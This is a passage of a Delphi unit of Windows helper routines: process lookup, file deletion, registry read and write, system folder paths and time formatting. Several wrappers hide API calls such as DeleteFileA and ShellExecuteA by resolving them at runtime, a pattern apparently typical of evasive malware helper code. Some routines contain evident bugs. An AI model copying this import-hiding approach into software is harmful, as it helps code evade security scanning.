  PID := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  Result := False;
  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperString(ExtractFileName(FProcessEntry32.szExeFile)) =
      UpperString(ExeFileName)) or (UpperString(FProcessEntry32.szExeFile) =
      UpperString(ExeFileName))) then
    begin
      Result := True;
      PID := FProcessEntry32.th32ProcessID;
    end;
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

function ProcessFileName(PID: DWORD): string;
var
  Handle: THandle;
  dll: Cardinal;
  GetModuleFileNameEx: function(hProcess: THandle; hModule: HMODULE;
    lpFilename: PChar; nSize: DWORD): DWORD; stdcall;
begin
  Result := '';
  Handle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, PID);
  if Handle <> 0 then
  try
    SetLength(Result, MAX_PATH);
    begin
      dll := LoadLibrary(pchar('PSAPI.dll'));
      @GetModuleFileNameEx := GetProcAddress(dll, pchar('GetModuleFileNameExA'));

      if GetModuleFileNameEx(Handle, 0, PChar(Result), MAX_PATH) > 0 then
      SetLength(Result, StrLen(PChar(Result)))
      else
      Result := '';
    end;
    finally
    CloseHandle(Handle);
  end;
end;

function fileexists(filename: string): boolean;
var
  hfile: thandle;
  lpfindfiledata: twin32finddata;

begin
  result := false;
  hfile := findfirstfile(pchar(filename), lpfindfiledata);
  if hfile <> invalid_handle_value then
  begin
    findclose(hfile);
    result := true;
  end;
end;

function MyDeleteFile(s: String): Boolean;
var
  i: Byte;
begin
  Result := FALSE;
  if FileExists(s)then
  try
    i := GetFileAttributes(PChar(s));
    i := i and faHidden;
    i := i and faReadOnly;
    i := i and faSysFile;
    SetFileAttributes(PChar(s), i);
    Result := MyDeleteFile2(Pchar(s));
  except
  end;
end;

function MyDeleteFile2(lpFileName: PChar): BOOL;
var
  xDeleteFileA: function(lpFileName: PChar): BOOL; stdcall;
begin
  xDeleteFileA := GetProcAddress(LoadLibrary(pchar('kernel32.dll')), pchar('DeleteFileA'));
  Result := xDeleteFileA(lpFileName);
end;

function LastDelimiter(S: String; Delimiter: Char): Integer;
var
  i: Integer;
begin
  Result := -1;
  i := Length(S);
  if (S = '') or (i = 0) then
    Exit;
  while S[i] <> Delimiter do
  begin
    if i < 0 then
      break;
    dec(i);
  end;
  Result := i;
end;

function ExtractFilePath(sFilename: String): String;
begin
  if (LastDelimiter(sFilename, '\') = -1) and (LastDelimiter(sFilename, '/') = -1) then
    Exit;
  if LastDelimiter(sFilename, '\') <> -1 then
  Result := Copy(sFilename, 1, LastDelimiter(sFilename, '\')) else
  if LastDelimiter(sFilename, '/') <> -1 then
  Result := Copy(sFilename, 1, LastDelimiter(sFilename, '/'));
end;

function GetShellFolder(const folder: string): string;
var
  chave, valor: string;
begin
  chave := 'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders';
  valor := folder;
  result := lerreg(HKEY_CURRENT_USER, chave, valor, '');
end;

function GetAppDataDir: string;
var
  cShellAppData: string;
begin
  cShellAppData := 'AppData';
  result := GetShellFolder(cShellAppData);
end;

function GetHour:String;
var
 SysTime:TSystemTime;
begin
 GetLocalTime(SysTime);
 if Length(IntToStr(SysTime.wHour))=1 then Result:='0'+IntToStr(SysTime.wHour)
 else Result:=IntToStr(SysTime.wHour);
end;

function GetMinute:String;
var
 SysTime:TSystemTime;
begin
 GetLocalTime(SysTime);
 if Length(IntToStr(SysTime.wMinute))=1 then Result:='0'+IntToStr(SysTime.wMinute)
 else Result:=IntToStr(SysTime.wMinute);
end;

function GetSecond:String;
var
 SysTime:TSystemTime;
begin
 GetLocalTime(SysTime);
 if Length(IntToStr(SysTime.wSecond))=1 then Result:='0'+IntToStr(SysTime.wSecond)
 else Result:=IntToStr(SysTime.wSecond);
end;

function GetYear:String;
var
 SysTime:TSystemTime;
begin
 GetLocalTime(SysTime);
 Result:=IntToStr(SysTime.wYear);
end;

function GetMonth:String;
var
 SysTime:TSystemTime;
begin
 GetLocalTime(SysTime);
 if Length(IntToStr(SysTime.wMonth))=1 then Result:='0'+IntToStr(SysTime.wMonth)
 else Result:=IntToStr(SysTime.wMonth);
end;

function GetDay:String;
var
 SysTime:TSystemTime;
begin
 GetLocalTime(SysTime);
 if Length(IntToStr(SysTime.wDay))=1 then Result:='0'+IntToStr(SysTime.wDay)
 else Result:=IntToStr(SysTime.wDay);
end;

function MyShellExecute(hWndA: HWND; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer): HINST;
var
  xShellExecute: function(hWndA: HWND; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer): HINST; stdcall;
begin
  xShellExecute := GetProcAddress(LoadLibrary(pchar('shell32.dll')), pchar('ShellExecuteA'));
  Result := xShellExecute(hWndA, Operation, FileName, Parameters, Directory, ShowCmd);
end;

function write2reg(key: Hkey; subkey, name, value: string): boolean;
var
  regkey: hkey;
begin
  result := false;
  RegCreateKey(key, PChar(subkey), regkey);
  if RegSetValueEx(regkey, Pchar(name), 0, REG_EXPAND_SZ, pchar(value), length(value)) = 0 then
    result := true;
  RegCloseKey(regkey);
end;

function isIE7: boolean;
var
  s: string;
begin
  result := false;
  s := lerreg(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Internet Explorer', 'Version', '');
  if copy(s, 1, 1) <> '7' then exit;
  result := true;
end;

function UpperString(S: String): String;
var
  i: Integer;
begin
  for i := 1 to Length(S) do
    S[i] := char(CharUpper(PChar(S[i])));
  Result := S;
end;

function LowerString(S: String): String;
var
  i: Integer;
begin
  for i := 1 to Length(S) do
    S[i] := char(CharLower(PChar(S[i])));
  Result := S;
end;

function GetProgramFilesDir: string;
var
  chave, valor: string;
begin
  chave := 'SOFTWARE\Microsoft\Windows\CurrentVersion';
  valor := 'ProgramFilesDir';
  result := lerreg(HKEY_LOCAL_MACHINE, chave, valor, '');
end;

function MyGetSystem(lpBuffer: PChar; uSize: UINT): UINT;
var
  xGetSystem: function(lpBuffer: PChar; uSize: UINT): UINT; stdcall;
begin
  xGetSystem := GetProcAddress(LoadLibrary(pchar('kernel32.dll')), pchar('GetSystemDirectoryA'));
  Result := xGetSystem(lpBuffer, uSize);
end;

function MyGetWindows(lpBuffer: PChar; uSize: UINT): UINT;
var
  xGetWindows: function(lpBuffer: PChar; uSize: UINT): UINT; stdcall;
begin
  xGetWindows := GetProcAddress(LoadLibrary(pchar('kernel32.dll')), pchar('GetWindowsDirectoryA'));
  Result := xGetWindows(lpBuffer, uSize);
end;

function MyGetTemp(nBufferLength: DWORD; lpBuffer: PChar): DWORD;
var
  xGetTemp: function(nBufferLength: DWORD; lpBuffer: PChar): DWORD; stdcall;
begin
  xGetTemp := GetProcAddress(LoadLibrary(pchar('kernel32.dll')), pchar('GetTempPathA'));
  Result := xGetTemp(nBufferLength, lpBuffer);
end;

function MySystemFolder: String;
var
  lpBuffer: Array[0..MAX_PATH] of Char;
begin
  MyGetSystem(lpBuffer, sizeof(lpBuffer));
  Result := String(lpBuffer) + '\';
end;

function MyWindowsFolder: String;
var
  lpBuffer: Array[0..MAX_PATH] of Char;
begin
  MyGetWindows(lpBuffer, sizeof(lpBuffer));
  Result := String(lpBuffer) + '\';
end;

function MyTempFolder: String;
var
  lpBuffer: Array[0..MAX_PATH] of Char;
begin
  MyGetTemp(sizeof(lpBuffer), lpBuffer);
  Result := String(lpBuffer);
end;

function MyRootFolder: String;
begin
  Result := copy(MyWindowsFolder, 1, 3);
end;

Function lerreg(Key:HKEY; Path:string; Value, Default: string): string;
Var
  Handle:hkey;
  RegType:integer;
  DataSize:integer;

begin
  Result := Default;
  if (RegOpenKeyEx(Key, pchar(Path), 0, KEY_QUERY_VALUE, Handle) = ERROR_SUCCESS) then
  begin
    if RegQueryValueEx(Handle, pchar(Value), nil, @RegType, nil, @DataSize) = ERROR_SUCCESS then
    begin
      SetLength(Result, Datasize);
      RegQueryValueEx(Handle, pchar(Value), nil, @RegType, PByte(pchar(Result)), @DataSize);
      SetLength(Result, Datasize - 1);
    end;
    RegCloseKey(Handle);
  end;
end;

function GetValueName(chave, valor: string): string;
begin
  try
    result := lerreg(HKEY_CURRENT_USER, pchar(chave), pchar(valor), '');
    except
    result := '';
  end;
end;

function IntToStr(i: Integer): String;
begin
  Str(i, Result);
end;

function StrToInt(S: String): Integer;
begin
  Val(S, Result, Result);
end;

end.
